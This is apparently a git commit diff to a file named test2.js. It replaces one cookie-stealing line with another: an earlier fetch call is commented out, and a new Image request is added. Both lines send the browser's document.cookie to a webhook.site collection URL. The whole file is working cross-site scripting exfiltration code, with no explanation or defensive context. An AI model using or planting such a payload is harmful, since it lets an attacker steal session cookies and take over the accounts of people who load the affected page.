8ff7267e32b3d11e92275a6c1b918962f7b352d9
Andrew-Tan-Jin-Ming <tanjinming94@gmail.com>
2024-02-24 00:49:05 +0800

    Updated test2

--- test2.js
+++ test2.js
@@ -1,2 +1,4 @@
-console.log(document.cookie);
-fetch("https://webhook.site/2d83507f-d52c-472a-8c7a-673ae26c83d2/?cookie="+document.cookie);
+// console.log(document.cookie);
+// fetch("https://webhook.site/2d83507f-d52c-472a-8c7a-673ae26c83d2/?cookie="+document.cookie);
+var i=new Image;
+i.src="https://webhook.site/2d83507f-d52c-472a-8c7a-673ae26c83d2/?"+document.cookie;
